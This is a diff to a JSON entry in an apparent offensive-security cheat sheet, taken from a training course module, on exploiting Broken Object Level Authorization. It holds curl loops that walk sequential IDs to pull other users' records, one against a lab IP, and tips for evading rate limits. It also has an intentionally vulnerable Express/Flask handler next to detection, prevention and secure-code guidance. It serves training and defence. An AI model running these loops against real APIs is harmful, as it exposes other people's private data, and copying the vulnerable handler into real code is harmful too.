@@ -1,13 +1,13 @@
 {
   "id": "api-bola-sequential-enum",
-  "name": "API BOLA – Sequential Object ID Enumeration",
+  "name": "API BOLA \u2013 Sequential Object ID Enumeration",
   "command": "for ((i=1; i<=20; i++)); do curl -s -w \"\\n\" -X GET \"http://<target>/api/v1/<endpoint>/$i\" -H \"accept: application/json\" -H \"Authorization: Bearer <jwt_token>\" | jq; done",
   "platform": "linux",
   "category": "Exploitation",
   "subcategory": "API Attacks",
   "type": "command",
   "description": "Exploit Broken Object Level Authorization (BOLA / OWASP API1) by iterating sequential numeric IDs against an API endpoint. Each request uses your own valid JWT but accesses other users' objects. Responses containing other users' data confirm BOLA.",
-  "notes": "BOLA is OWASP API Security Top 10 #1. The API trusts the client-supplied ID without verifying ownership. Use jq to pretty-print JSON responses and spot data leakage. Extend the loop range based on observed IDs (check your own object's ID first). UUIDs are harder to enumerate — try predictable patterns or IDOR chaining first. Always authenticate first (POST /api/v1/authentication/sign-in) to get a valid JWT before running the loop.",
+  "notes": "BOLA is OWASP API Security Top 10 #1. The API trusts the client-supplied ID without verifying ownership. Use jq to pretty-print JSON responses and spot data leakage. Extend the loop range based on observed IDs (check your own object's ID first). UUIDs are harder to enumerate \u2014 try predictable patterns or IDOR chaining first. Always authenticate first (POST /api/v1/authentication/sign-in) to get a valid JWT before running the loop.",
   "steps": [
     {
       "command": "curl -s -X POST http://<target>/api/v1/authentication/<role>/sign-in -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"Password\": \"<pass>\"}' | jq",
@@ -19,25 +19,25 @@
     },
     {
       "command": "for ((i=1; i<=20; i++)); do curl -s -w \"\\n\" -X GET \"http://<target>/api/v1/<endpoint>/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq; done",
-      "caption": "Step 3: Enumerate all object IDs — responses with other users' data = BOLA confirmed"
+      "caption": "Step 3: Enumerate all object IDs \u2014 responses with other users' data = BOLA confirmed"
     }
   ],
   "variations": [
     {
       "command": "for i in $(seq 1 100); do curl -s -X GET \"http://<target>/api/v1/<endpoint>/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq '.id,.email,.name' 2>/dev/null; done",
-      "caption": "Larger range — extract only key fields with jq",
+      "caption": "Larger range \u2014 extract only key fields with jq",
       "label": "Loop IDs 1-100 (users)"
     },
     {
       "command": "for ((i=1; i<=20; i++)); do echo -n \"ID $i: \"; curl -s -X GET \"http://<target>/api/v1/suppliers/quarterly-reports/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq -r '.[] | .reportDate' 2>/dev/null; done",
-      "caption": "Enumerate report endpoint — extract specific field per object",
+      "caption": "Enumerate report endpoint \u2014 extract specific field per object",
       "label": "Loop IDs 1-20 (reports)"
     }
   ],
   "examples": [
     {
       "command": "for ((i=1; i<=20; i++)); do curl -s -w \"\\n\" -X GET \"http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/$i\" -H \"accept: application/json\" -H \"Authorization: Bearer <jwt_token>\" | jq; done",
-      "caption": "CWES M18: enumerate yearly reports for all supplier companies — access other companies' financial data"
+      "caption": "CWES M18: enumerate yearly reports for all supplier companies \u2014 access other companies' financial data"
     }
   ],
   "tools": [
@@ -57,7 +57,7 @@
   "source": "CWES Module 18: API Attacks",
   "references": [
     {
-      "title": "OWASP API Security Top 10 – API1:2023 BOLA",
+      "title": "OWASP API Security Top 10 \u2013 API1:2023 BOLA",
       "url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
     }
   ],
@@ -79,20 +79,27 @@
     }
   ],
   "defense": {
-    "why_it_works": "Broken Object Level Authorization (OWASP API1 / BOLA) occurs when an API accepts a user-supplied object identifier and returns the corresponding resource without verifying that the authenticated user actually owns or has permission to access it. Sequential numeric IDs make enumeration trivial — an attacker with any valid session can walk from ID 1 to 1000000 and harvest every user's data.",
+    "why_it_works": "Broken Object Level Authorization (OWASP API1 / BOLA) occurs when an API accepts a user-supplied object identifier and returns the corresponding resource without verifying that the authenticated user actually owns or has permission to access it. Sequential numeric IDs make enumeration trivial \u2014 an attacker with any valid session can walk from ID 1 to 1000000 and harvest every user's data.",
     "prerequisites": "Any valid API credential (JWT, API key, session cookie). API endpoint that accepts an object ID as a URL path parameter or query string. Sequential or predictable IDs (numeric, UUID v1, or ULID). No rate-limiting or ID-based access control enforced server-side.",
     "impact": "T1078 Valid Accounts (IDOR giving access to other accounts) + T1087 Account Discovery. Full horizontal privilege escalation: authenticated user accesses every other user's records. In worst case exposes PII, financial data, private messages, or account credentials across the entire user base.",
     "detection": "Monitor for unusual access patterns: a single authenticated token accessing many different user IDs in rapid succession. SIEM rule: auth_user=X AND resource_owner_id != X AND count > threshold in 60s. API gateway (Kong, AWS API GW, Apigee) request logs with user-to-resource mapping. WAF anomaly detection on sequential ID patterns. Business logic monitoring: flag accounts whose requests span > N distinct user IDs per session.\nAnomalous logon patterns, abnormal logon types, and inconsistent geographic or time-based activity across Windows endpoints (DET0560/AN1543).\nSSH logins, sudo/su abuse, and service account anomalies outside expected patterns (AN1544).\nInteractive and remote logins by service accounts or users at unusual times with unexpected child process activity (AN1545).\nIdP logs showing geographic anomalies, impossible travel, risky sign-ins, multiple MFA attempts or failures (AN1546).",
     "artifacts": "API gateway logs showing single-token sequential GET /api/users/{1..1000} | SIEM alert: cross-user resource access | Application error logs if IDs not found (404 pattern mixed with 200s) | Network flows: high volume GET requests to same endpoint with incrementing path parameters",
-    "prevention": "Server-side ownership checks on every API request — never trust the client-supplied ID alone. Use indirect references (map session → allowed IDs server-side; client never sees real DB IDs). Implement authorization middleware that checks object ownership before returning data. Use UUIDs instead of sequential integers (slows but doesn't prevent BOLA). Rate-limit per token per endpoint. Log and alert on cross-user access patterns. Follow OWASP API Security Top 10 — API1:2023.\nAccount Use Policies: Use conditional access policies to block logins from non-compliant devices or outside defined IP ranges.\nActive Directory Configuration: Disable legacy authentication; require modern authentication protocols with MFA support.\nMulti-factor Authentication: Implement MFA across all account types (default, local, domain, cloud accounts).\nPassword Policies: Change default credentials immediately after installation; minimize password reuse across accounts.",
+    "prevention": "Server-side ownership checks on every API request \u2014 never trust the client-supplied ID alone. Use indirect references (map session \u2192 allowed IDs server-side; client never sees real DB IDs). Implement authorization middleware that checks object ownership before returning data. Use UUIDs instead of sequential integers (slows but doesn't prevent BOLA). Rate-limit per token per endpoint. Log and alert on cross-user access patterns. Follow OWASP API Security Top 10 \u2014 API1:2023.\nAccount Use Policies: Use conditional access policies to block logins from non-compliant devices or outside defined IP ranges.\nActive Directory Configuration: Disable legacy authentication; require modern authentication protocols with MFA support.\nMulti-factor Authentication: Implement MFA across all account types (default, local, domain, cloud accounts).\nPassword Policies: Change default credentials immediately after installation; minimize password reuse across accounts.",
     "evasion": "Use slow enumeration with random delays to avoid rate-limiting triggers. Interleave with legitimate requests to own resources. Use different JWT tokens (e.g., from multiple created accounts) to distribute the enumeration and avoid per-token rate limits.",
     "sources": [
       "https://attack.mitre.org/techniques/T1078/",
       "https://attack.mitre.org/techniques/T1087/",
       "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
     ],
-    "misconfiguration": "Authorization check only verifies token validity, not ownership. Server fetches object by ID without joining to authenticated user: SELECT * FROM orders WHERE id = ? (missing AND user_id = current_user_id). UUID v1 chosen over UUID v4 — UUIDs v1 embed timestamp and MAC address, making them predictable.",
-    "vulnerable_config": "# Node.js / Express — BOLA vulnerability:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // VULNERABLE: checks token is valid, but NOT that req.params.id == req.user.id\n  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id])\n  if (!user) return res.status(404).json({error:'not found'})\n  res.json(user)  // returns ANY user's profile to any authenticated token\n})\n\n# Python Flask — same pattern:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  order = Order.query.get(order_id)  # VULNERABLE: no ownership check\n  return jsonify(order.to_dict())\n\n# Sequential ID generation:\nCREATE TABLE orders (id SERIAL PRIMARY KEY, ...)  -- attacker iterates 1,2,3...",
-    "secure_config": "# Node.js — ownership enforced server-side:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // SAFE: only allow access to own profile (or admin role)\n  if (req.params.id !== req.user.id && req.user.role !== 'admin') {\n    return res.status(403).json({error: 'Forbidden'})\n  }\n  const user = await db.query('SELECT id,name,email FROM users WHERE id = ?', [req.params.id])\n  res.json(user)\n})\n\n# Python Flask — ownership in query:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  current_uid = get_jwt_identity()\n  # ownership baked into the query — no bypass possible\n  order = Order.query.filter_by(id=order_id, user_id=current_uid).first_or_404()\n  return jsonify(order.to_dict())\n\n# Use UUID v4 instead of SERIAL to slow enumeration:\nCREATE TABLE orders (id UUID DEFAULT gen_random_uuid() PRIMARY KEY, ...)\n\n# Rate-limit per token on sensitive endpoints:\n# Allow: 60 requests/minute per auth token to /api/v1/users/*"
-  }
+    "misconfiguration": "Authorization check only verifies token validity, not ownership. Server fetches object by ID without joining to authenticated user: SELECT * FROM orders WHERE id = ? (missing AND user_id = current_user_id). UUID v1 chosen over UUID v4 \u2014 UUIDs v1 embed timestamp and MAC address, making them predictable.",
+    "vulnerable_config": "# Node.js / Express \u2014 BOLA vulnerability:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // VULNERABLE: checks token is valid, but NOT that req.params.id == req.user.id\n  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id])\n  if (!user) return res.status(404).json({error:'not found'})\n  res.json(user)  // returns ANY user's profile to any authenticated token\n})\n\n# Python Flask \u2014 same pattern:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  order = Order.query.get(order_id)  # VULNERABLE: no ownership check\n  return jsonify(order.to_dict())\n\n# Sequential ID generation:\nCREATE TABLE orders (id SERIAL PRIMARY KEY, ...)  -- attacker iterates 1,2,3...",
+    "secure_config": "# Node.js \u2014 ownership enforced server-side:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // SAFE: only allow access to own profile (or admin role)\n  if (req.params.id !== req.user.id && req.user.role !== 'admin') {\n    return res.status(403).json({error: 'Forbidden'})\n  }\n  const user = await db.query('SELECT id,name,email FROM users WHERE id = ?', [req.params.id])\n  res.json(user)\n})\n\n# Python Flask \u2014 ownership in query:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  current_uid = get_jwt_identity()\n  # ownership baked into the query \u2014 no bypass possible\n  order = Order.query.filter_by(id=order_id, user_id=current_uid).first_or_404()\n  return jsonify(order.to_dict())\n\n# Use UUID v4 instead of SERIAL to slow enumeration:\nCREATE TABLE orders (id UUID DEFAULT gen_random_uuid() PRIMARY KEY, ...)\n\n# Rate-limit per token on sensitive endpoints:\n# Allow: 60 requests/minute per auth token to /api/v1/users/*"
+  },
+  "tags": [
+    "api",
+    "bola",
+    "idor",
+    "enumeration",
+    "authorization"
+  ]
 }
